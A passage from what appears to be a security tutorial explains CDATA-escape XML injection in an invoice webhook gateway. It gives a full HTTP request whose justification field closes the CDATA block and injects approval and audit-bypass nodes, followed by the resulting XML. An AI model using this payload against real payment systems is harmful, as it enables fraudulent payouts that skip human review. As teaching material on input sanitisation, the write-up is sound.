\[1] The API Gateway acts as the translation layer, accepting modern JSON webhooks from vendors and compiling them into rigid XML documents for the internal event-sourcing engine, \[2] The backend enforces strict default security configurations: all incoming invoices are explicitly marked as `IsApproved: false` and `RequiresAudit: true,` \[3] To support rich-text descriptions from the vendor's CRM without crashing the downstream XML parser on unescaped ampersands or brackets, the developer wraps the justification payload in a CDATA section, \[4] The fatal encapsulation failure. Because the developer assumes CDATA blocks represent absolute containment boundaries, they fail to strip the literal sequence `]]>` from the incoming JSON string. The attacker leverages this to prematurely terminate the CDATA context, re-entering the active XML execution space. The downstream parser accepts the duplicate state-mutating nodes, overriding the default security properties via last-node-wins resolution

```http
// 1. Attacker (Malicious Vendor) submits a massive, fraudulent invoice via the JSON API.
// 2. Attacker injects the CDATA termination sequence followed by state-overriding XML nodes.
POST /api/v1/invoices/webhook HTTP/1.1
Host: gateway.enterprise.tld
Authorization: Bearer <vendor_api_token>
Content-Type: application/json

{
  "vendorId": "VND-9912",
  "amount": 8500000.00,
  "justificationNote": "Services rendered.]]></Justification><IsApproved>true</IsApproved><RequiresAudit>false</RequiresAudit><Justification><![CDATA["
}
```

```http
// 3. The API Gateway string-interpolates the payload into the XML Document.
// 4. The downstream Accounting Engine parses the message queue event:
// <Justification><![CDATA[Services rendered.]]></Justification>
// <IsApproved>true</IsApproved>
// <RequiresAudit>false</RequiresAudit>
// <Justification><![CDATA[]]></Justification>

// 5. The engine evaluates the invoice, registers IsApproved=true, and schedules the immediate payout.
```
{% endstep %}

{% step %}
To ensure continuous ingestion of third-party financial data, the API Gateway utilized CDATA blocks to insulate the strict downstream XML parser from unpredictable text formatting. By assuming that CDATA elements function as absolute cryptographic boundaries, the architecture explicitly omitted structural input sanitization. The attacker exploited this by providing the exact byte sequence required to terminate the CDATA block (`]]>`), instantly escaping the data context and returning to the executable DOM space. The injected nodes permanently altered the state properties of the invoice. The downstream accounting engine processed the perfectly valid XML document, accepted the injected approval flags over the defaults, and automatically authorized a fraudulent multi-million dollar payout without triggering human review mechanisms
{% endstep %}
{% endstepper %}

***

## Cheat Sheet
